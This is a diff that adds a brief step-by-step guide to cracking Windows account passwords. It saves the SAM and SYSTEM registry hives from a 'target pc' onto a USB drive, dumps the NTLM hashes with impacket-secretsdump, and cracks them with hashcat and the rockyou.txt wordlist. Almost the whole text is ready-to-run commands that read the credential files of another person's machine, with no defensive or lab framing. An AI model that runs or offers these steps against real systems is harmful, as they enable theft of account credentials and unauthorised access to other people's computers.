@@ -1,0 +1,32 @@
+This is for cracking window hash
+level: 1
+type: temporary access
+
+Requirement:
+- usb flash drive
+- sam and system file
+- rockyou.txt or other password list
+- tools: impacket-secretsdump(turn sam and system into hash), hashcat(crack hash)
+
+Tools installation: 
+impacket-secretsdump and hashcat automatically install on kali 
+for Debian base distros: 'sudo apt install impacket' & 'sudo apt install hashcat'
+for Arch base distros: 'sudo pacman -S impacket' & 'sudo pacman -S hashcat'
+
+Getting start:
+make sure you have access to your target pc.
+1. get sam and system file:
+- make sure usb flash drive is plugged in your terget pc and make sure to remember it name (example: D:,E:,F:) 
+2. in terminal:
+- reg save HKLM\sam ./sam.save
+- reg save HKLM\system ./sys.save
+- copy sam.save D:
+- copy sys.save D:
+after saving the file eject the flash drive and plug it your pc.(make sure everything is ready)
+3. move sam.save and sys.save from flash drive to pc
+4. open your gui file system then go into /usr/share/wordlists/rockyou.txt.gz and move rockyou.txt into the same dir as sam.save and sys,save
+5. in interminal cd into the dir that contain those file:
+- impacket-secretsdump -sam sam.save -system sys.save (then copy the hash of the user which is the 'y' then paste in a new file hashes.txt. example:{user10:::xxxxxxxxxxxxxxxxxxxxxxxxx:yyyyyyyyyyyyyyyyyyyyyy:::})
+- sudo hashcat -m 1000 hashes.txt rockyou.txt
+6. if 'crack' it success if something else then it fail (try checking the list of password again or give more data to it and also check sam.save and sys.save if there any data lost)
+
